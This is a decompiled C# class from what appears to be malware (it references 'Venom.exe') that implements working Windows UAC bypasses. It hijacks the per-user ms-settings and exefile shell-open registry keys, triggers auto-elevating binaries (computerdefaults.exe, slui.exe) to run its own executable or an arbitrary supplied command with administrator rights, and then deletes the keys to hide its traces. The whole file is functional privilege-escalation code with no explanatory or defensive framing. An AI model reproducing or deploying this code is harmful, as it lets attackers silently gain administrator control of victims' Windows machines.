using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

public class GClass63
{
	public static void smethod_0()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			smethod_3("Classes");
			smethod_3("Classes\\ms-settings");
			smethod_3("Classes\\ms-settings\\shell");
			smethod_3("Classes\\ms-settings\\shell\\open");
			RegistryKey registryKey = smethod_3("Classes\\ms-settings\\shell\\open\\command");
			registryKey.SetValue("", Application.get_ExecutablePath(), RegistryValueKind.String);
			registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
			registryKey.Close();
			try
			{
				Process.Start(new ProcessStartInfo
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					FileName = "cmd.exe",
					Arguments = "/c start computerdefaults.exe"
				});
			}
			catch (Exception)
			{
			}
			Process.GetCurrentProcess().Kill();
		}
		else
		{
			smethod_3("Classes\\ms-settings\\shell\\open\\command").SetValue("", "", RegistryValueKind.String);
		}
		Thread.Sleep(10000);
		string location = Assembly.GetExecutingAssembly().Location;
		smethod_3("Classes\\ms-settings\\shell\\open\\command").DeleteSubKeyTree(location);
	}

	public GClass63(byte[] encodedCommand)
	{
		string @string = Encoding.UTF8.GetString(encodedCommand);
		RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\", writable: true);
		registryKey!.CreateSubKey("exefile\\Shell\\Open\\command");
		RegistryKey? registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Classes\\exefile\\Shell\\Open\\command", writable: true);
		registryKey2!.SetValue("", @string);
		registryKey2!.Close();
		Process process = new Process();
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.FileName = "C:\\windows\\system32\\slui.exe";
		process.StartInfo.Verb = "runas";
		process.Start();
		Thread.Sleep(10000);
		registryKey!.DeleteSubKeyTree("exefile");
	}

	public static void smethod_1(string filename)
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			smethod_3("Classes");
			smethod_3("Classes\\ms-settings");
			smethod_3("Classes\\ms-settings\\shell");
			smethod_3("Classes\\ms-settings\\shell\\open");
			RegistryKey registryKey = smethod_3("Classes\\ms-settings\\shell\\open\\command");
			registryKey.SetValue("", filename, RegistryValueKind.String);
			registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
			registryKey.Close();
			try
			{
				Process.Start(new ProcessStartInfo
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					FileName = "cmd.exe",
					Arguments = "/c start computerdefaults.exe"
				});
			}
			catch (Exception)
			{
			}
			Process.GetCurrentProcess().Kill();
		}
		else
		{
			smethod_3("Classes\\ms-settings\\shell\\open\\command").SetValue("", "", RegistryValueKind.String);
		}
		Thread.Sleep(10000);
		string location = Assembly.GetExecutingAssembly().Location;
		smethod_3("Classes\\ms-settings\\shell\\open\\command").DeleteSubKeyTree(location);
	}

	public static void smethod_2()
	{
		string empty = string.Empty;
		empty = Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Venom.exe"));
		empty = Path.Combine(Path.Combine(Environment.GetFolderPath((GClass56.Architecture == 64) ? Environment.SpecialFolder.ProgramFilesX86 : Environment.SpecialFolder.ProgramFiles), "Venom.exe"));
		empty = Path.Combine(Path.Combine(Environment.GetFolderPath((GClass56.Architecture == 64) ? Environment.SpecialFolder.SystemX86 : Environment.SpecialFolder.System), "Venom.exe"));
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			smethod_3("Classes");
			smethod_3("Classes\\ms-settings");
			smethod_3("Classes\\ms-settings\\shell");
			smethod_3("Classes\\ms-settings\\shell\\open");
			RegistryKey registryKey = smethod_3("Classes\\ms-settings\\shell\\open\\command");
			registryKey.SetValue("", empty, RegistryValueKind.String);
			registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
			registryKey.Close();
			try
			{
				Process.Start(new ProcessStartInfo
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					FileName = "cmd.exe",
					Arguments = "/c start computerdefaults.exe"
				});
			}
			catch (Exception)
			{
			}
			Process.GetCurrentProcess().Kill();
		}
		else
		{
			smethod_3("Classes\\ms-settings\\shell\\open\\command").SetValue("", "", RegistryValueKind.String);
		}
		Thread.Sleep(10000);
		string location = Assembly.GetExecutingAssembly().Location;
		smethod_3("Classes\\ms-settings\\shell\\open\\command").DeleteSubKeyTree(location);
	}

	public static RegistryKey smethod_3(string string_0)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\" + string_0, writable: true);
		if (!smethod_4(registryKey))
		{
			registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + string_0);
		}
		return registryKey;
	}

	public static bool smethod_4(RegistryKey registryKey_0)
	{
		return registryKey_0 != null;
	}
}
